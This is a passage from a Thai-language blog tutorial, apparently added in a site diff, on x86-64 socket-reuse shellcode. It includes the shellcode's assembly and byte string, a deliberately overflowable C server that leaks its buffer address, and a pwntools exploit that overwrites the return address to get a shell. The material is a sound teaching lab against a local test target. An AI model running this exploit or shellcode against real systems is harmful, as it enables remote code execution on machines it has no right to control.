+                        ; else execv spawn shell
+    jne loop_dup2
+
+
+
+exec_shell:
+    ; 3. Execute /bin/sh.
+    ; I don't know how to write shellcode to spawn shell just use the snippet from http://shell-storm.org/shellcode/files/shellcode-806.php .
+
+    xor rax, rax
+    mov rbx, 0xFF978CD091969DD1
+    neg rbx
+    push rbx
+    push rsp
+    pop rdi
+    cdq
+    push rdx
+    push rdi
+    push rsp
+    pop rsi
+    mov al, 0x3b
+    syscall
+
+;
+; Python3
+;   sc = b&quot;\x48\x31\xd2\x48\x89\xd7\x52\x52\x48\x89\xe6\xb2\x10\x52\x48\x89\xe2\x48\xff\xc7\x48\x31\xc0\xb0\x34\x0f\x05\x48\x85\xc0\x75\xf1\x48\x31\xf6\x48\x89\xf0\xb0\x21\x0f\x05\x48\xff\xc6\x40\x80\xfe\x03\x75\xf0\x48\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
+;   Length: 79 bytes
+;
+
+</code></pre>
+<h2 id="มาทดสอบ-shellcode-กนดกวาคาบ">มาทดสอบ Shellcode กันดีกว่าค้าบ</h2>
+<p>ขั้นแรกเลยผมใช้โจทย์จาก <a href="https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/">DHAYALAN</a>  มาโมอ่ะ เพราะขี้เกียจเขียนเองจะได้แบบนี้ค้าบ</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt; 
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;errno.h&gt;
+
+// src: https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/
+// use for testing Socket-reuse shellcode x64
+
+int newsockfd;
+
+void error(const char *msg)
+{
+    perror(msg);
+    exit(1);
+}
+void greet(int newsockfd){
+  int n;
+  char Hello[500];
+  char buffer[2048];
+
+  sprintf(Hello, &quot;Welcome to my server!Send a message!\nbuffer: %lp\n&quot;, &amp;buffer);
+
+  write(newsockfd,Hello,strlen(Hello));
+
+  n = read(newsockfd,buffer,4095);
+  if (n &lt; 0) error(&quot;ERROR reading from socket&quot;);
+
+}
+int main(int argc, char *argv[])
+{
+     int sockfd, portno;
+     socklen_t clilen;
+     char buffer[4096], reply[5100];
+	struct sockaddr sock;
+     struct sockaddr_in serv_addr, cli_addr;
+     int n;
+     sockfd = socket(AF_INET, SOCK_STREAM, 0);
+     if (sockfd &lt; 0) 
+        error(&quot;ERROR opening socket&quot;);
+     bzero((char *) &amp;serv_addr, sizeof(serv_addr));
+     portno = 1337;
+     serv_addr.sin_family = AF_INET;
+     serv_addr.sin_addr.s_addr = INADDR_ANY;
+     serv_addr.sin_port = htons(portno);
+     if (bind(sockfd, (struct sockaddr *) &amp;serv_addr,
+              sizeof(serv_addr)) &lt; 0) 
+              error(&quot;ERROR on binding&quot;);
+	printf(&quot;\n\n Server socket number is %d\n\n&quot;,sockfd);
+     listen(sockfd,5);
+
+     clilen = sizeof(cli_addr);
+     newsockfd = accept(sockfd, 
+                 (struct sockaddr *) &amp;cli_addr, 
+                 &amp;clilen);
+	printf(&quot;\n\n Client socket number is %d\n\n&quot;,newsockfd);
+     if (newsockfd &lt; 0) 
+          error(&quot;ERROR on accept&quot;);
+     while (1) {
+        greet(newsockfd);
+        }
+     close(newsockfd);
+     close(sockfd);
+     return 0; 
+}
+</code></pre>
+<p>จากนั้นเราลองเขียน <a href="https://gist.github.com/jusmistic/08c1ae03cb1cef85ecfecbec9e4855ce#file-03_exploit-py">exploit.py</a> จะได้แบบนี้ค้าบบ</p>
+<pre><code class="language-python">from pwn import *
+
+def exp():
+    p = remote(&quot;localhost&quot;, 1337)
+
+    p.recvuntil(&quot;: &quot;)
+    client_addr = int(p.recvline()[:-1], 16)
+    print(f&quot;Buffer Address: {hex(client_addr)}&quot;)
+    # p.recvuntil(&quot;: &quot;)
+
+    sc = b&quot;\x48\x31\xd2\x48\x89\xd7\x52\x52\x48\x89\xe6\xb2\x10\x52\x48\x89\xe2\x48\xff\xc7\x48\x31\xc0\xb0\x34\x0f\x05\x48\x85\xc0\x75\xf1\x48\x31\xf6\x48\x89\xf0\xb0\x21\x0f\x05\x48\xff\xc6\x40\x80\xfe\x03\x75\xf0\x48\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
+    buf =b&quot;&quot;
+    buf += b&quot;\x90&quot;*200
+    buf += sc
+    buf += b&quot;\x90&quot;*(0xa00-len(buf))
+    buf += b&quot;B&quot;*8
+    buf += p64(client_addr+150)
+    buf += b&quot;D&quot;*20
+
+    p.sendline(buf)
+
+    p.interactive()
+exp()
+</code></pre>
+<p>เมื่อเราลองทำการรัน Exploit ก็จะเห็นว่าเราสามารถติดต่อกับ shell ของเราผ่าน sockfd ของ socket ที่เราใช้โจมตี โดยที่เมื่อเราจะตรวจสอบดูค่า FD ของ Process โจทย์ของเราจะเห็นว่ามันเชื่อมไปที่ FD ของ Socket เรานั้นเอง (ตรงหมายเลข 1)</p>
+<p><img src="https://i.imgur.com/byYFTtX.png" alt=""></p>
+<p>Code ทั้งหมดอยู่ที่ Gist นี้ค้าบบบ</p>
+<p><a href="https://gist.github.com/jusmistic/08c1ae03cb1cef85ecfecbec9e4855ce">Socket-reuse-Linux-x86-64.asm</a></p>
+<p>สำหรับบทความนี้ก็จบแค่นี้ค้าบ ถ้าสงสัยตรงไหนไปถาม <a href="https://web.facebook.com/bank.eakasit">@Bankie</a> นะค้าบทักไปได้ 24 hr เบยยย</p>
+<p>ขอบคุณที่อ่านจนจบค้าบ ถ้าใครอ่านแล้วงง ๆ ตรงไหนก็สู้ ๆ แล้วกัน(หยอกๆๆ) ผมอาจเขียนไม่ค่อยดีเท่าไรค้าบเลยงง มีอะไรแนะนำกันได้หรือถ้าผิดตรงไหนก็บอกได้เลยนะครับ ยินดีมาก ๆ จะเอาไปปรับปรุง ❤</p>
+<p>ขอบคุณเทพ Bongtrop ที่ช่วยดูบทความให้ครับ กราบงาม ๆ สักสามทีครัพ</p>
+<p>สุดท้ายแล้วก็ฝากไว้ประโยคเดียวค้าบ</p>
+<blockquote>
+<p>UV ไม่ดีต่อผิว แต่ U so cute ไม่ดีต่อจัยค้าบบบ</p>
+</blockquote>
+<p><strong>บรัย</strong></p>
+<h2 id="reference">Reference</h2>
+<ul>
+<li><a href="https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/">Linux x86 One-Way Shellcode. (Socket Reuse)</a></li>
+<li><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">Linux System Call Table</a></li>
+<li><a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">getpeername(2) - Linux manual page</a></li>
+<li><a href="https://man7.org/linux/man-pages/man2/dup2.2.html">dup(2) - Linux manual page</a></li>
+<li><a href="http://shell-storm.org/shellcode/files/shellcode-806.php">Linux/x86-64 - Execute /bin/sh - 27 bytes</a></li>
+</ul>
+
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row justify-content-center">
+                    <div class="col-lg-8">
+                        
+                    </div>
+                </div></article>
+        </div>
+    </div>
+
+    
+</main>
+
+
+    <footer class="footer text-center bg-dark py-2">
+    <div class="container">
+        <div class="row">
+            <div class="col">
+                <ul class="list-inline">
+                    
+                </ul>
+
+                <p class="text-muted">
+                    
+                        Copyright &copy; SUAM 2021
+                    
+                </p>
+
+                <p class="text-muted">
+                Powered by <a href="https://gohugo.io" target="_blank">Hugo</a> with <a href="https://github.com/puresyntax71/hugo-theme-chunky-poster" target="_blank">Chunky Poster</a>.
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+    
+    
+        
+            <script src="/dist/app.js"></script>
+        
+    
+        
+            <script src="/dist/lazyload.js"></script>
+        
+    
+        
+            <script src="/dist/main.js"></script>
+        
+    
+        
+            <script src="/dist/vendors~app.js"></script>
+        
+    
+        
+            <script src="/dist/vendors~app~bootstrap.js"></script>
+        
+    
+        
+            <script src="/dist/vendors~bootstrap.js"></script>
+        
+    
+        
+            <script src="/dist/vendors~ekkoLightbox.js"></script>
+        
+    
+
+
+
+<script>
+    window.Prism = window.Prism || {};
+    window.Prism.manual = true;
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/components/prism-core.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/plugins/autoloader/prism-autoloader.min.js"></script>
+
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"></script>
+<script>
+document.body.onload = () => {
+    renderMathInElement(document.body, {
+        delimiters: [
+            {left: "$$", right: "$$", display: true},
+            {left: "\\[", right: "\\]", display: true},
+            {left: "$", right: "$", display: false},
+            {left: "\\(", right: "\\)", display: false}
+        ]
+    });
+};
+</script>
+
+
+
+
+
+
+    
+</body>
+</html>
